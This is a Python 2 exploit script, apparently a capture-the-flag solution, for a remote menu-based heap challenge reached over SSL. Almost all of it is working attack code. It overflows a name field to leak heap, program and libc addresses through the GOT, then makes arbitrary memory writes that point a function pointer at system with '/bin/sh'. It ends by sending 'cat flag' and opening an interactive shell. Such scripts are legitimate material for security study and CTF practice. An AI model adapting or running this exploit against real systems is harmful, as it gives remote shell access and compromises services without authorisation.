#!/usr/bin/env python2

import sys, socket, telnetlib, ssl, time
import random
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    print '[+] Interactive shell'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
is_local = True
if sys.argv[1] != 'localhost':
	is_local = False
	s = ssl.wrap_socket(s)
s.connect((sys.argv[1], int(sys.argv[2])))
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

def change_name(name):
	recvuntil('--> ')
	s.send('1\n')
	recvuntil('--> ')
	s.send(name + '\n')

def add_entry():
	recvuntil('--> ')
	s.send('1\n')

def exit_menu():
	recvuntil('--> ')
	s.send('4\n')

def change_name_zero(name):
	name += '\x00'
	while '\x00' in name:
		name = name[:name.rfind('\x00')]
		tmp = name.replace('\x00', 'A')
		# print '[+] changing name to %s' % tmp.encode('hex')
		change_name(tmp)

def set_small(n):
	recvuntil('--> ')
	s.send('2\n')
	recvuntil('--> ')
	s.send(str(n) + '\n')

def set_large(n):
	recvuntil('--> ')
	s.send('3\n')
	recvuntil('--> ')
	s.send(str(n) + '\n')

def print_entries():
	recvuntil('--> ')
	s.send('2\n')
	return recvuntil('\n\n')

def leak(addr):
        # overwrite the Small field of the next entry, that is printed with %s later
	rndname = ''.join([str(random.randint(0, 9)) for i in range(8)])
	add_entry()
	change_name_zero(rndname + 'A'*248 + p64(addr))
	exit_menu()

	add_entry()
	exit_menu()

	t = print_entries()
	t = t[t.find('Name: ' + rndname):]
	t = t[t[1:].find('Name: '):]
	t = t[:t.find('\nLarge')]
	t = t[t.find('Small: ') + len('Small: '):]
	return t

def overwrite(addr, value, bb=False, val=0, zero=True):
        # overwrite the next field of the next entry, so that end_of_entry will
        # return that address (keep in mind that there should be a zero at addr - val - 8)
	print '[+] write %#x @ %#x' % (value, addr)
	add_entry()
	change_name_zero('A'*256 + p64(0) + p64(addr - 0x18 - val))
	exit_menu()

 	add_entry()
	set_small(0)
	set_large(0)
	if zero:
		change_name_zero('A'*val + p64(value))
	else:
		change_name('A'*val + p64(value))
 	exit_menu()


prog_base = 0x4000000000

# set large, so that it points to a malloc chunk
add_entry()
set_large(0x100)
exit_menu()

# get the address on the heap
t = print_entries()
t = t[t.index('Large: ') + len('Large: '):]
t = int(t[:t.index('\n')], 16)
heap_addr = t - 272 # address of first entry
heap_base = heap_addr & ~0xfff
print '[+] heap address = %#x' % heap_addr
print '[+] heap base = %#x' % heap_base

# at heap_base + 0x10 there is a pointer to end_of_entry
t = leak(heap_base + 0x10)
end_of_entry = u64(t.ljust(8, '\x00'))
if is_local: end_of_entry = 0x0000004000000f54
print '[+] end_of_entry @ %#x' % end_of_entry

prog_base = end_of_entry - 0xf54
print '[+] prog base = %#x' % prog_base

printf_got = 0x122E0
malloc_got = 0x012298
printf_offset = 0x0004f09c
system_offset = 0x0003ffd0
magic_gadget_offset = 0x0A1D74

# get a leak inside the libc
t = leak(prog_base + printf_got)
printf_addr = u64(t.ljust(8, '\x00'))
if is_local: printf_addr += 0x4000000000
libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset

print '[+] libc base = %#x' % libc_base
print '[+] printf address = %#x' % printf_addr
print '[+] system address = %#x' % system_addr

fp_ptr = 0x12200 + prog_base
bss = 0x12690 + prog_base

# end_of_entry is called with a pointer to the first entry in the heap, so
# let's write /bin/sh there
overwrite(heap_addr, u64('/bin/sh'.ljust(8, '\x00')), val=8)
# overwrite a ptr to ptr to end_of_entry to make it point to system
overwrite(bss + 0x50, system_addr)
overwrite(bss, bss + 0x50)
overwrite(fp_ptr, bss, zero=False)

# trigger a call to end_of_entry/system
add_entry()
set_small(0)
s.send('cat flag\n')
print s.recv(1024)

interactive()

s.close()

